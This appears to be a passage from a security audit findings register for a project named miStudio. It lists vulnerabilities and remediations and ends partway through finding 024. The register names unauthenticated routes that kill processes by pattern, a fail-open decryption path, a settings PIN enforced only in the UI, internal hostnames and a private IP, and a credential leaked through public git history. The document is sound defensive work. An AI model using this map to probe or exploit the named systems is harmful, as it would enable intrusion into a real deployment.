# FINDINGS — miStudio E2E Assessment 2026-08

**The register.** Append-only. One block per finding, stable id `MIS-E2E-###`.
Ids are never reused and never renumbered. A refuted finding is marked
`REFUTED` and stays in place so a later round cannot rediscover it as new.

Schema, severity rubric and verification rules: see [PLAN.md](PLAN.md).

**Count:** 166

> ### ⚠ MIS-E2E-143 — mechanism FIXED 2026-08-23; **credential rotation still outstanding**
> An SSH password for the GPU node, five database dumps, and this audit's own
> findings register are **published in a public GitHub repository**. The
> `sync-to-clean` filter removes them from the tip commit and force-pushes the
> full unfiltered history, so all of it is readable one commit back. Verified
> against the live public repo. Rotate the credential and make the mirror
> private before anything else in this register.
**Last id issued:** MIS-E2E-166

---

## Seeded — from the planning scan (2026-08-23)

These were observed while planning the assessment. They are recorded here so no
phase rediscovers them as new. Each carries the phase that owns its verification.

---

### MIS-E2E-001 — Four persona files are a year-stale copy describing a different project
- **Phase / Round:** P00 / seed — **CORRECTED at P01 R1**
- **Source:** planning scan; corrected when `/review` actually ran
- **Severity:** P3 *(downgraded from P2 — see the correction)*
- **Type:** debt
- **Location:** `.claude/agents/{architect,product_engineer,qa_engineer,test_engineer}.md`
- **Claim:** Four files named exactly like the `/review` personas sit in `.claude/agents/`, dated **2025-01-15**, describing a **different project** — Prisma schema, RTK Query, SAML auth middleware, "187 backend tests". None of the four contains the string `miStudio`, `SAE` or `steering`. They are duplicates-by-name of the real personas and have no other purpose.
- **CORRECTION — the original entry was wrong about the impact.** `/review` loads `@.claude/context/agents/*.md`, **not** `.claude/agents/`. That directory holds the real personas and they are **current and excellent**: last updated 2026-08-10, carrying the accumulated J-Lens-arc review lessons (matched-norm control, source-scrape guards failing open, regression tests inheriting their own trap, "confirm the edit LANDED"). `/review` is therefore **not** primed with wrong facts, and the audit workaround planned for it is unnecessary. The seeded entry asserted a consequence it had not checked — recorded here rather than quietly edited, because getting a finding's blast radius wrong is the same class of error the audit is looking for.
- **Failure scenario (what remains):** two sets of same-named persona files, one a year-stale copy of another project's state. `.claude/agents/` is also the real subagent-definition directory (`hardcore-debugger.md` lives there and is a working agent). Anyone globbing `.claude/agents/*.md` — a reasonable guess for "where the agents are" — gets the wrong four, which confidently assert "Security Score: 9/10" and "Error handling: COMPREHENSIVE" about a codebase that is not this one.
- **Evidence:** verified-by-live-repro — `/review` executed and observed loading `.claude/context/agents/`; both directories compared; the stale four grep-negative for every miStudio term
- **Doc reference:** `.claude/commands/review.md` Step 1
- **Verification (R3):** CONFIRMED at P01 R1, with the impact corrected
- **Proposed remediation:** Delete the four files in `.claude/agents/`. They are not referenced by anything and their only effect is to be found by mistake.
- **Effort:** S

### MIS-E2E-002 — No PADR IDL documents the "no application-layer auth" posture
- **Phase / Round:** P00 / seed → P05 owns verification
- **Source:** planning scan
- **Severity:** P2
- **Type:** doc-drift
- **Location:** `backend/src/core/deps.py` (35 lines, supplies only `get_db`); `0xcc/adrs/000_PADR|miStudio.md` (46 IDLs, none on this)
- **Claim:** None of the 270 REST routes has application-layer authentication. Per the assessment's locked decision this is an accepted posture — nginx plus network isolation is the control — but **no IDL states it**, so the posture is indistinguishable from an oversight to the next reader, and nothing constrains where the boundary is allowed to move.
- **Failure scenario:** A future change exposes the backend directly (a new ingress, a port-forward left in a manifest, a developer running compose with the backend port published) and nothing in the document chain says that this is the thing holding the whole security model up. IDL-22 covers path injection and stack-trace exposure but is silent on authn/authz.
- **Evidence:** verified-by-live-repro (`grep -rE "get_current_user|HTTPBearer|Security\(" backend/src/api/` → 0 hits; PADR IDL list read, 46 entries, none on authn)
- **Doc reference:** none — that is the finding
- **Verification (R3):** pending
- **Proposed remediation:** Add a PADR IDL stating the control (nginx as the sole ingress, LAN isolation, the `/api/internal/` HMAC layer as the one in-app exception), its boundary, and what would invalidate it. Note that `SECURITY.md` should agree.
- **Effort:** S

---

### MIS-E2E-003 — Unauthenticated routes run a pattern `pkill -9` and spawn a Celery worker
- **Phase / Round:** P00 / seed → P05
- **Source:** planning scan
- **Severity:** P1
- **Type:** security
- **Location:** `backend/src/api/v1/endpoints/steering.py:394`, `:625` (pkill); `:433`, `:532` (Popen)
- **Claim:** `POST /steering/reset` and `POST /steering/exit-mode` shell out to `pkill -9 -f steering@` — a *pattern* kill that SIGKILLs any process on the host whose cmdline contains `steering@`, not only workers this app started. `POST /steering/enter-mode` spawns a Celery worker via `subprocess.Popen`.
- **Failure scenario:** Any process on the host whose command line happens to contain `steering@` — another user's shell, an unrelated container sharing the PID namespace, a `grep steering@` in someone's terminal — is SIGKILLed by an HTTP request. Conversely a caller can spawn workers repeatedly to exhaust GPU or memory. Recorded separately from MIS-E2E-002 because process kill and process spawn are privilege operations regardless of who can reach the port.
- **Evidence:** plausible (read-only; the argv is fixed and list-form, so this is not injection — it is over-broad pattern matching plus an unauthenticated privilege operation)
- **Doc reference:** none
- **Verification (R3):** pending
- **Proposed remediation:** Track spawned worker PIDs and signal those, rather than matching a cmdline pattern; bound worker spawn with an idempotency/concurrency guard.
- **Effort:** M

---

### MIS-E2E-004 — `decrypt_value` fails open on `InvalidTag`
- **Phase / Round:** P00 / seed → P02
- **Source:** planning scan
- **Severity:** P1
- **Type:** security
- **Location:** `backend/src/core/encryption.py:61` (function), `:118` (the fail-open return)
- **Claim:** `decrypt_value` catches every exception — including `cryptography.exceptions.InvalidTag`, i.e. authentication failure — logs a warning, and returns the raw stored value as if it were plaintext. AES-GCM was chosen for authenticated encryption; swallowing the auth failure discards the integrity half of it.
- **Failure scenario:** A row whose ciphertext has been tampered with, or whose key has rotated, is returned to the caller as a plaintext credential. Downstream that value is used as an API key or endpoint URL. The caller cannot distinguish "this was never encrypted" (the legacy case the fallback was written for) from "this failed authentication".
- **Evidence:** plausible (read-only)
- **Doc reference:** PADR IDL-20 (DB-backed settings with AES-256-GCM)
- **Verification (R3):** pending — mutation control planned in P02 R2
- **Proposed remediation:** Distinguish "not an envelope" (short/undecodable → legacy plaintext, return as-is) from `InvalidTag` (→ raise). Only the former is the legacy case.
- **Effort:** S

---

### MIS-E2E-005 — The Settings PIN is a UI gate that protects nothing
- **Phase / Round:** P00 / seed → P02/P05
- **Source:** planning scan
- **Severity:** P1
- **Type:** security
- **Location:** `backend/src/api/v1/endpoints/settings.py:39-105` (the PIN), `:112`, `:138`, `:166`, `:195` (the routes that ignore it)
- **Claim:** The PIN primitive is well built — PBKDF2-SHA256 at 600,000 iterations, random salt, `hmac.compare_digest` verify. But `POST /settings/pin/verify` only returns `{valid: bool}`; `GET /settings`, `GET /settings/{key}`, `PUT /settings`, `PUT /settings/bulk` and `DELETE /settings/{key}` never check it. Separately, `MISTUDIO_BYPASS_PIN` lets `POST /settings/pin/set` change the PIN without knowing the current one, and advertises itself through `GET /settings/pin/status`.
- **Failure scenario:** Anything that can reach the API reads and writes every setting — including the encrypted API-key rows — without the PIN. The UI shows a locked gate over an unlocked door, which is worse than no gate because it communicates a protection that is not there.
- **Evidence:** plausible (read-only)
- **Doc reference:** PADR IDL-25 (Settings Panel PIN Protection)
- **Verification (R3):** pending — live repro against k8s planned
- **Proposed remediation:** Enforce the PIN server-side on the settings routes (a short-lived token issued by `/pin/verify`), or amend IDL-25 to state explicitly that the PIN is a UI affordance and not an access control.
- **Effort:** M

---

### MIS-E2E-006 — The hardened path resolver has exactly one production caller
- **Phase / Round:** P00 / seed → P02
- **Source:** planning scan
- **Severity:** P2
- **Type:** security
- **Location:** `backend/src/core/config.py:404-464` (`resolve_user_path`), `:362-395` (`resolve_data_path`); the sole caller is `backend/src/services/sae_manager_service.py:543`
- **Claim:** `resolve_user_path` is carefully built — pure-string `normpath` so it never touches the filesystem with raw user data, then allow-list `commonpath` containment against three realpath'd roots. It is called from one place. Every other path in the backend goes through `resolve_data_path`, which performs no containment check and returns an arbitrary absolute path if it exists.
- **Failure scenario:** The trust boundary rests entirely on each caller correctly classifying its input as DB-sourced vs user-supplied. One misclassification — a path that arrives from a request body and is treated as DB-sourced — reaches `resolve_data_path` and escapes the data root. There is no type-level or naming distinction to make that mistake visible in review.
- **Evidence:** verified-by-live-repro (call-site grep)
- **Doc reference:** PADR IDL-22 (Security Hardening — Path Injection)
- **Verification (R3):** pending
- **Proposed remediation:** Audit every `resolve_data_path` call site for user-reachable input; consider a distinct type for untrusted paths so the classification is checked by the compiler rather than by memory.
- **Effort:** M

---

### MIS-E2E-007 — `aaaa/` publishes the dev-internal doc chain to the public mirror
- **Phase / Round:** P00 / seed → P10
- **Source:** planning scan
- **Severity:** P2
- **Type:** security
- **Location:** `aaaa/` (tracked, 12+ files); `.github/workflows/sync-to-clean.yml:27-45`
- **Claim:** `aaaa/` is a tracked duplicate of the `0xcc` document chain — it contains `000_PADR|miStudio.md`, `000_PPRD|miStudio.md`, several FPRD/FTDD/FTASKS files and a `00_MANIFEST.md`. The `sync-to-clean` workflow removes `0xcc/`, `.claude/`, `CLAUDE.md`, `backups/` and `scripts/` before force-pushing to the public `hitsainet/miStudio` repo — but it does not remove `aaaa/`. So the material the filter exists to withhold is published anyway, through a copy.
- **Failure scenario:** Internal architecture decisions, business requirements and roadmap are readable in the public repo. Worse, they are a *stale* copy, so the public repo carries out-of-date internal docs with no indication they are superseded.
- **Evidence:** verified-by-live-repro (`git ls-files aaaa | head` returns tracked files; the workflow's `rm -rf` list read at `sync-to-clean.yml:30-45` has no `aaaa` entry)
- **Doc reference:** none
- **Verification (R3):** pending — confirm against the public repo's actual contents
- **Proposed remediation:** Delete `aaaa/` (it is a duplicate, not a source), and add a guard test asserting the sync filter's exclusion list covers everything matching the doc-chain filename pattern, so the next copy cannot slip through either.
- **Effort:** S

---

### MIS-E2E-008 — Five database dumps are committed to git history
- **Phase / Round:** P00 / seed → P10
- **Source:** planning scan
- **Severity:** P2
- **Type:** security
- **Location:** `backups/mistudio_db_20251218_*.sql.gz` (5 files, 104 KB total, tracked)
- **Claim:** Five gzipped PostgreSQL dumps are committed. The `sync-to-clean` filter does strip `backups/` from the public mirror, so they are not currently published — but they are in this repo's history permanently, and the protection is one line of a workflow away from lapsing.
- **Failure scenario:** The dumps carry whatever was in the database on 2025-12-18 — settings rows (including encrypted API-key ciphertext and its envelope), dataset and model paths, and any user-entered prompt text. A repo history is not a secret store; anyone with clone access has them, and removing them later requires a history rewrite.
- **Evidence:** verified-by-live-repro (`git ls-files backups` → 5 files)
- **Doc reference:** none
- **Verification (R3):** pending — inspect one dump for settings/prompt content to fix the severity
- **Proposed remediation:** `git rm` them, add `backups/` to `.gitignore`, and decide whether a history rewrite is warranted based on what the dumps actually contain.
- **Effort:** S (removal) / L (history rewrite, if warranted)

---

### MIS-E2E-009 — Internal hostnames and a private IP are hardcoded in shipped frontend source
- **Phase / Round:** P00 / seed → P08
- **Source:** planning scan
- **Severity:** P3
- **Type:** security
- **Location:** `frontend/src/components/panels/SettingsPanel.tsx:480`, `:547`, `:583`; `frontend/src/components/labeling/StartLabelingButton.tsx:196`; `frontend/vite.config.ts` (`allowedHosts`)
- **Claim:** UI defaults and placeholders bake in `http://millm-backend.millm.svc.cluster.local:8000/v1`, `http://k8s-millm.hitsai.local`, the private IP `http://192.168.244.61:8001/v1`, and `http://mistudio.hitsai.local/ollama/v1`. These ship in a repo that is publicly mirrored, and production sourcemaps are on (see MIS-E2E-020), so they are readable in the deployed bundle too.
- **Failure scenario:** Internal network topology — a k8s service DNS name, a namespace, a private IP and port — is disclosed to anyone reading the public repo or the shipped bundle. Not exploitable alone; useful to someone who is already inside.
- **Evidence:** verified-by-live-repro (line-level grep)
- **Doc reference:** none
- **Verification (R3):** pending
- **Proposed remediation:** Move to build-time env (`import.meta.env`) with neutral placeholders in source.
- **Effort:** S

---

### MIS-E2E-010 — `CLAUDE.md` and `/review` reference two files that do not exist
- **Phase / Round:** P00 / seed → P11
- **Source:** planning scan
- **Severity:** P3
- **Type:** doc-drift
- **Location:** `CLAUDE.md` ("Quick Resume Commands", "Context Recovery") cites `0xcc/session_state.json`; `.claude/commands/review.md:57` cites `.claude/context/health/dashboard.md`
- **Claim:** Neither file exists. `CLAUDE.md` tells a resuming session that `session_state.json` "is automatically loaded"; `/review` Step 5 instructs the reviewer to update a health dashboard that was never created (only `assessment_template.md` is present in that directory).
- **Failure scenario:** A resuming session follows the documented recovery procedure and silently gets nothing, believing it has loaded state. `/review` Step 5 either fails or is skipped, so the health-impact step of every review has been a no-op.
- **Evidence:** verified-by-live-repro (`ls` on both paths)
- **Doc reference:** self
- **Verification (R3):** pending
- **Proposed remediation:** Create the two files or remove the references. `CLAUDE.md` also references `0xcc/transcripts/`, `0xcc/checkpoints/` and `0xcc/project-specs/` in its folder-structure diagram — none of the three exists either; fold that into the same fix.
- **Effort:** S

---

### MIS-E2E-011 — The PPRD status column contradicts the task lists
- **Phase / Round:** P00 / seed → P11
- **Source:** planning scan
- **Severity:** P2
- **Type:** doc-drift
- **Location:** `0xcc/prds/000_PPRD|miStudio.md` §2.1 rows 19, 21, 22, 23, 24, 27; the corresponding `0xcc/tasks/0{18,20,21,22,23,26}_FTASKS|*.md`
- **Claim:** The PPRD inventory is the stated authority on product feature status and disagrees with the task lists in both directions. Rows 22/23/24 read "Planned" while FTASKS 021 is 40/41 done and FTASKS 023 is 35/35. Row 27 reads "Planned" while FTASKS 026 is 16/16. Row 21 reads "Implemented" while FTASKS 020 carries a `[~]` "Hardware acceptance outstanding". Row 19 reads "Planned" and FTASKS 018 is 0/11 — consistent — yet three full review rounds exist for feature 018.
- **Failure scenario:** The PPRD is the document a new session or a stakeholder reads to learn what exists. It currently understates shipped work and cannot be used to decide what to build next. Feature 018 is the sharp case: 68 KB of review records against a task list where nothing is checked, so either the reviews reviewed unmarked-but-shipped code or the task file was abandoned — and the documents cannot tell you which.
- **Evidence:** verified-by-live-repro (checkbox counts per file)
- **Doc reference:** self
- **Verification (R3):** pending — resolve each row against the code, not against the other document
- **Proposed remediation:** Reconcile row by row against shipped code; then decide which document is authoritative for status and make the other derive from it.
- **Effort:** M

---

### MIS-E2E-012 — 193 open tasks sit in files with no `## Relevant Files` section
- **Phase / Round:** P00 / seed → P11
- **Source:** planning scan
- **Severity:** P2
- **Type:** debt
- **Location:** `0xcc/tasks/{IMPL_Celery_Steering_Migration,BUGFIX_TASKS|MultiSAE_Import,UI_TASKS|Feature_Browser_Range_Filtering,DOCS_TASKS|Documentation_Update_Jan2025,UI_TASKS|Labeling_Template_Variable_Insertion,SUPP_TASKS|BPE_Token_Reassembly_Fix}.md`; also FTASKS 024–028
- **Claim:** 348 task boxes are unchecked repo-wide. 193 of them — more than the entire numbered feature chain's 155 — are in six ad-hoc files, none of which has the `## Relevant Files` section the framework requires. `IMPL_Celery_Steering_Migration.md` alone is 32,859 bytes with 61 open and 0 done, while PADR IDL-13 and the session log both describe the steering async migration as having shipped.
- **Failure scenario:** `## Relevant Files` is the framework's documented doc→code join key. Without it there is no way to tell from the documents whether this work shipped, was abandoned, or is outstanding — which is exactly the state `IMPL_Celery_Steering_Migration` is in. Five FTASKS files (024–028) have the same gap.
- **Evidence:** verified-by-live-repro (per-file checkbox and section counts)
- **Doc reference:** `0xcc/instruct/008_process-task-list.md` (Relevant Files is required and maintained)
- **Verification (R3):** pending
- **Proposed remediation:** Triage each ad-hoc file: close it as shipped, delete it as abandoned, or add `## Relevant Files` and keep it. Start with the Celery steering migration, whose status is contradicted by the ADR.
- **Effort:** M

---

### MIS-E2E-013 — Nine features have never been reviewed
- **Phase / Round:** P00 / seed → P11
- **Source:** planning scan
- **Severity:** P2
- **Type:** debt
- **Location:** features 010, 011, 019, 020, 024, 025, 026, 027, 028
- **Claim:** `0xcc/reviews/` is a single batch from 2026-07-11 covering 001–009 only. `.claude/context/sessions/` adds 012–018 and the J-Lens arc. Nine features have no review record of any kind — including 010 (MCP Server, 68 tasks done) and 020 (Checkpoint Lifecycle, which shipped destructive checkpoint pruning).
- **Failure scenario:** The assessment itself is the mitigation, but the gap is worth recording: these nine are where an unreviewed defect is most likely, and P01–P12 should weight effort toward the code they own.
- **Evidence:** verified-by-live-repro (review file inventory cross-referenced against the feature list)
- **Doc reference:** `0xcc/reviews/000_SYNTHESIS.md` scope
- **Verification (R3):** pending
- **Proposed remediation:** Covered by this assessment. Afterwards, record which phase covered each previously-unreviewed feature so the gap does not silently reopen.
- **Effort:** —

---

### MIS-E2E-014 — A second, parallel Socket.IO client exists
- **Phase / Round:** P00 / seed → P09
- **Source:** planning scan
- **Severity:** P2
- **Type:** bug
- **Location:** `frontend/src/api/websocket.ts` (173 lines) vs `frontend/src/contexts/WebSocketContext.tsx` (247 lines)
- **Claim:** Two independent Socket.IO layers exist. The context is the live one — single connection, `transports: ['polling','websocket']`, re-subscribes all channels on reconnect, queues calls made before the socket is ready. `api/websocket.ts` is a separate `WebSocketClient` singleton with its own `io()` call, `transports: ['websocket']` only, and hand-rolled `subscribeToDatasetProgress` / `TrainingProgress` / `TrainingCheckpoints` / `LabelingResults`. It has no test file.
- **Failure scenario:** If anything imports it, the app opens a second connection with different transport settings and a different subscription registry — so a channel subscribed through one layer receives nothing emitted to the other, and the reconnect re-subscription logic that only the context has does not apply. Silent divergence, not a crash.
- **Evidence:** **verified-by-live-repro — RESOLVED at P07 R1.** Grepped the whole of `frontend/src` for `websocketClient` and for any import of `api/websocket`: **no importers**. The module is entirely dead code. Two latent defects inside it were noted and not filed separately, since nothing calls them: `connect()` would spawn a second Manager if called on a disconnected socket, and its `reconnect*` listeners are Manager events that never fire on a Socket.
- **Severity revised:** **P2 → P3.** The risk was "if anything imports it, a second connection opens with different transports and a separate subscription registry". Nothing does. What remains is a 173-line untested duplicate of the live transport sitting next to it, which is a deletion task, not a defect.
- **Doc reference:** PADR IDL-1, IDL-12
- **Verification (R3):** **CONFIRMED dead at P07 R1**
- **Proposed remediation:** Delete it.
- **Effort:** S

---

### MIS-E2E-015 — ~19,000 backend service lines have no matching test file
- **Phase / Round:** P00 / seed → P02/P05
- **Source:** planning scan
- **Severity:** P2
- **Type:** test-gap
- **Location:** 29 of 76 modules in `backend/src/services/`; 11 of 25 in `backend/src/api/v1/endpoints/`; 3 of 8 in `backend/src/ml/`
- **Claim:** By filename matching, roughly 19,000 lines of service code have no test file named for them — led by `steering_service.py` (2,993, the largest file in the repo), `extraction_service.py` (2,116), `jlens_acquire_service.py` (1,180), `nlp_analysis_service.py` (1,109), `circuit_capture_service.py` (1,075) and `neuronpedia_local_service.py` (1,043). On the endpoint side `features.py` (1,095 lines, 21 routes) is the largest unmatched. In `ml/`, `community_format.py` (1,233) — the SAE interop format — is unmatched.
- **Failure scenario:** Filename matching over-credits (a module may be exercised by a test named for something else) and under-credits (indirect coverage), so this is a triage list, not a verdict. It tells the assessment where mutation controls will pay: a load-bearing line in a module with no test named for it is the highest-probability surviving mutation.
- **Evidence:** verified-by-live-repro (filename cross-match), but the *conclusion* is plausible until mutations run
- **Doc reference:** PADR testing standards (>80% coverage target)
- **Verification (R3):** pending — resolved per-module by the phase's mutation pass
- **Proposed remediation:** Per-module, driven by which mutations survive rather than by the line count.
- **Effort:** L

---

### MIS-E2E-016 — Frontend test coverage is absent across whole layers
- **Phase / Round:** P00 / seed → P07/P08
- **Source:** planning scan
- **Severity:** P2
- **Type:** test-gap
- **Location:** `frontend/src/{stores,hooks,api,utils,components}/`
- **Claim:** 11 of 20 stores, 11 of 17 panels, 17 of 19 hooks, 18 of 22 API modules and 8 of 13 utils have no test file. `SettingsPanel.tsx` (1,368 lines) and `labelingStore.ts` (667) are untested. `WebSocketContext.tsx` (247 lines) has no direct test and is exercised only incidentally through `renderWithProviders`. No test files exist at all under `components/{circuits,extraction,extractionTemplates,featureGroups,labeling,saes,trainingTemplates}/`.
- **Failure scenario:** As above — this is where mutations will survive. The WebSocket context is the sharpest case: it is the single connection every realtime feature depends on, its reconnect re-subscription is the logic that a past bug lived in, and nothing tests it directly.
- **Evidence:** verified-by-live-repro (file inventory)
- **Doc reference:** PADR testing standards
- **Verification (R3):** pending
- **Proposed remediation:** Prioritise by mutation survival, starting with `WebSocketContext.tsx`.
- **Effort:** L

---

### MIS-E2E-017 — The MCP server's own instructions misstate its tool count
- **Phase / Round:** P00 / seed → P06
- **Source:** planning scan
- **Severity:** P3
- **Type:** doc-drift
- **Location:** `backend/src/mcp_server/server.py:32` (`SERVER_INSTRUCTIONS`); `backend/src/mcp_server/contract.py:9`
- **Claim:** `SERVER_INSTRUCTIONS` — the text served to every connecting agent — says "92 tools across 13 categories". The registry defines 117 tools across 14 categories (83 across 9 enabled by default). `contract.py:9` says "the 58 native tools"; there are 85. The generated contract computes its count dynamically (`contract.py:171`), so only the prose is wrong.
- **Failure scenario:** An agent reads the server's own instructions to decide what is available. The number is a statement the server makes about itself and it is wrong by 25 tools; the category count is wrong by one, which matters because categories are the gating unit. Low blast radius, but it is the server lying about its own surface — and this repo has already shipped 16 tools that existed in the docs and not in the registry.
- **Evidence:** verified-by-live-repro (registry counted per module against `CATEGORY_MODULES` + `MILLM_CATEGORY_MODULES`)
- **Doc reference:** `docs/mcp-contract.md`
- **Verification (R3):** **CONFIRMED at baseline against the live k8s MCP server** (`http://mcp-mistudio.hitsai.local/mcp`). `mistudio_howto(topic='tools')`, which derives from the live registry, reports `tool_count: 116` across **14** categories: admin 2, circuits 24, experiments 3, groups 6, jlens 19, jobs 1, labeling 3, millm_circuits 16, millm_clusters 6, millm_runtime 5, millm_sensing 5, profiles 4, read 12, steering 10. (116 not 117 because `get_approval_status` registers only under `MCP_STEERING_APPROVAL=true`, which is off in this deployment.) The prose says 92/13.
- **Also drifted:** `mistudio_howto(topic='tool_map')` repeats the same wrong number — *"the server instructions named 17 of 92 tools"* — and states **"CIRCUITS ... (`circuits`, 19 tools)"** where the live registry has **24**. So the number is wrong in three places, and the one place it is right (`topic='tools'`) is the one that derives it from the registry instead of restating it.
- **Proposed remediation:** Derive both strings from the registry at build time, the way `contract.py:171` already does, so the prose cannot drift again.
- **Effort:** S

---

### MIS-E2E-018 — Two comments give opposite accounts of who handles CORS
- **Phase / Round:** P00 / seed → P09/P05
- **Source:** planning scan
- **Severity:** P3
- **Type:** doc-drift
- **Location:** `backend/src/core/websocket.py:15` vs `backend/src/main.py:85-86`
- **Claim:** `main.py` deliberately installs no `CORSMiddleware` and says so: CORS is nginx's job, and adding it here would duplicate headers. `core/websocket.py:15` states that CORS *is* handled by `CORSMiddleware` in `main.py`. One of the two is what a future reader will act on.
- **Failure scenario:** A developer debugging a CORS failure reads `websocket.py`, looks for the middleware in `main.py`, does not find it, and adds one — reintroducing the duplicate-header bug the comment in `main.py` exists to prevent.
- **Evidence:** verified-by-live-repro (both comments read)
- **Doc reference:** none
- **Verification (R3):** pending
- **Proposed remediation:** Correct `websocket.py:15`.
- **Effort:** S

---

### MIS-E2E-019 — A second FastAPI app ships in the tree, unwired
- **Phase / Round:** P00 / seed → P02
- **Source:** planning scan
- **Severity:** P3
- **Type:** debt
- **Location:** `backend/services/ollm_server/` (1,221 lines: `inference.py` 642, `main.py` 352, `models.py` 161, `config.py` 51)
- **Claim:** A complete second FastAPI application lives beside `src/`, is not referenced by `src/api/v1/router.py`, and installs its own `CORSMiddleware(allow_origins=settings.allowed_origins)` — the only CORS middleware anywhere in the backend, in the one app that is not wired up.
- **Failure scenario:** Dead code that looks live. It is inside the Docker build context and shares `src/core/config.py`, so it inherits configuration changes without inheriting review. If `allowed_origins` is ever `["*"]` alongside credentials, the finding upgrades.
- **Evidence:** verified-by-live-repro (no import path from the router)
- **Doc reference:** none — no IDL or FPRD mentions it
- **Verification (R3):** pending — establish whether anything runs it (a compose service, a Dockerfile entrypoint, a k8s command)
- **Proposed remediation:** Delete it, or document it and bring it under test.
- **Effort:** S

---

### MIS-E2E-020 — Production sourcemaps and 519 console calls ship to the browser
- **Phase / Round:** P00 / seed → P08
- **Source:** planning scan
- **Severity:** P3
- **Type:** debt
- **Location:** `frontend/vite.config.ts` (`build.sourcemap: true`); 519 `console.log|warn|error` calls in non-test source
- **Claim:** The production build emits full sourcemaps, and no console stripping is configured, so all 519 logging calls run in the deployed app — including `stores/datasetsStore.ts:82`, which logs an access token's length.
- **Failure scenario:** The shipped bundle is fully readable source (compounding MIS-E2E-009), and the console carries operational detail — channel names, ids, a token-shaped length signal — to anyone with devtools open.
- **Evidence:** verified-by-live-repro (config read; occurrence count)
- **Doc reference:** none
- **Verification (R3):** pending
- **Proposed remediation:** Turn sourcemaps off for production or upload them privately; strip `console.log`/`debug` at build and keep `warn`/`error`.
- **Effort:** S

---

### MIS-E2E-021 — The type-check and lint gates have holes
- **Phase / Round:** P00 / seed → P07
- **Source:** planning scan
- **Severity:** P3
- **Type:** debt
- **Location:** `frontend/tsconfig.json` (`exclude` covers test files), `frontend/package.json` (no `format:check`), `frontend/eslint.config.js` (`no-explicit-any: 'warn'`), `frontend/vite.config.ts` (no coverage block)
- **Claim:** `npm run type-check` and `npm run build` do not type-check test files — `tsconfig.test.json` exists but no script references it. There is a `format` script but no `--check` counterpart, so formatting is unverifiable in CI. `no-explicit-any` is a warning, so the 172 `any`s in production code (403 including tests) never fail lint. `@vitest/coverage-v8` is installed but no coverage block or threshold is configured.
- **Failure scenario:** Four quality gates that appear to exist do not bite. The `any` concentration matters most: it clusters at the WebSocket payload boundary (`WebSocketContext.on` takes `(...args: any[])`), so every realtime payload enters the app untyped — the exact boundary where P09's payload findings will live.
- **Evidence:** verified-by-live-repro (config files read; occurrence counts)
- **Doc reference:** PADR coding standards (TypeScript strict, ESLint Airbnb)
- **Verification (R3):** pending
- **Proposed remediation:** Add `type-check:test`, `format:check`, coverage thresholds; raise `no-explicit-any` to error with a ratchet.
- **Effort:** M

---

### MIS-E2E-022 — Unowned migration-audit scripts and non-hex revision ids
- **Phase / Round:** P00 / seed → P01
- **Source:** planning scan
- **Severity:** P3
- **Type:** debt
- **Location:** `backend/{audit_migrations.py,check_migrations.py,check_type_mismatches.py,find_column_gaps.py}`; `backend/alembic/versions/` (98 revisions)
- **Claim:** Four standalone migration-audit scripts sit at the backend root with no caller in CI or the test suite. Separately, two revision-id conventions coexist: real hex hashes and hand-written sequential ids, some of which (`g3h4i5j6k7l8`) are not valid hex.
- **Failure scenario:** The scripts encode real knowledge about schema drift and nothing runs them, so their findings never surface. The id convention breaks any tooling that assumes alembic ids are hex — the four scripts above being the likely first casualties.
- **Evidence:** verified-by-live-repro (single head `c7e2a4f18b93` confirmed and guarded by `test_alembic_single_head.py`; id patterns read)
- **Doc reference:** PADR IDL-16 (Schema Validation Tooling)
- **Verification (R3):** pending — run each script and record what it reports
- **Proposed remediation:** Either wire the useful checks into CI or the suite, or delete them.
- **Effort:** S

---

## Phase 0 — Baseline round

---

### MIS-E2E-023 — `ReadoutGrid` calls two hooks after an early return
- **Phase / Round:** P00 / baseline — **reachability corrected at P08 R1**
- **Source:** eslint baseline (`react-hooks/rules-of-hooks`)
- **Severity:** P2 *(downgraded — see Verification)*
- **Type:** bug
- **Location:** `frontend/src/components/jlens/ReadoutGrid.tsx:87` (early return), `:111` and `:136` (the two `useMemo` calls after it)
- **Claim:** `ReadoutGrid` returns early — `if (axis.length === 0 || tokens.length === 0) return <p>This readout carries no layers for the selected lens.</p>` — and then calls `useMemo` twice further down (`firstDisagreement`, `logitRowOf`). React requires the same hooks in the same order on every render.
- **Failure scenario:** The component renders once with a non-empty axis, registering 2 hooks. The user then switches the lens type to one whose artifact covers no layers — the exact case the empty-state message and the surrounding comments ("a partial artifact reports only the layers it was fitted for", "the two axes are independent now") were written for. `axis` is derived at `JLensPanel.tsx:159` as `useMemo(() => axisFor(meta, readType), [meta, readType])`, so changing `readType` changes `axis` **without unmounting `ReadoutGrid`** — the component is rendered unconditionally at `JLensPanel.tsx:736`. On that render React sees 0 hooks where it saw 2 and throws *"Rendered fewer hooks than expected"*, crashing the J-Lens panel instead of showing the empty-state message it was supposed to show.
- **Evidence:** plausible (read-only) — the rule violation is verified by eslint and by reading; the *crash* is reasoned from the mount path, not yet reproduced
- **Doc reference:** 023_FPRD|JLens_Readout_Viewer; PADR IDL-40
- **Verification (R3):** **CORRECTED at P08 R1 — the defect is real, the crash is NOT currently reachable.** My reachability argument was wrong. I claimed switching `readType` to a lens with no fitted layers would re-render the grid with an empty axis. It cannot today: the lens-type selector is populated from `meta.types`, and the backend emits `types` and `layers_by_type` from **the same tuple, on adjacent lines** — `jlens_readout_service.py:550-551`, `types=[t.lens_type for t, _ in servable]` and `layers_by_type={t.lens_type: list(ls) for t, ls in servable}`. Every type offered therefore has a non-empty axis by construction, so `axis.length === 0` is unreachable while the grid is mounted.
- **Severity revised:** **P1 → P2.** The Rules of Hooks violation is real and eslint reports it; the crash it would cause is held off by an invariant maintained in one backend expression. The moment a servable type can carry zero layers — a partial artifact, a per-layer applicability change, a refactor that splits those two lines — the intended empty-state message becomes a "rendered fewer hooks" crash of the whole panel. Recorded as a latent crash rather than a live one, because a register that overstates is as useless as one that misses.
- **Proposed remediation:** Move the early return below both `useMemo` calls (they are cheap and both already guard their own inputs), or lift the empty check into `JLensPanel` so the grid is not mounted at all when there is nothing to draw.
- **Effort:** S
- **Note:** this file passed three review rounds and 15 mutation controls in the J-Lens enhancement arc (2026-08-10). `npm run lint` has been reporting it the whole time — nothing runs lint as a gate (see MIS-E2E-024).

---

### MIS-E2E-024 — `npm run lint` fails on `main` and nothing gates on it
- **Phase / Round:** P00 / baseline
- **Source:** baseline measurement
- **Severity:** P2
- **Type:** debt
- **Location:** `frontend/` — `npx eslint .` exits 1 with **34 errors / 494 warnings**; `.github/workflows/frontend-ci.yml`
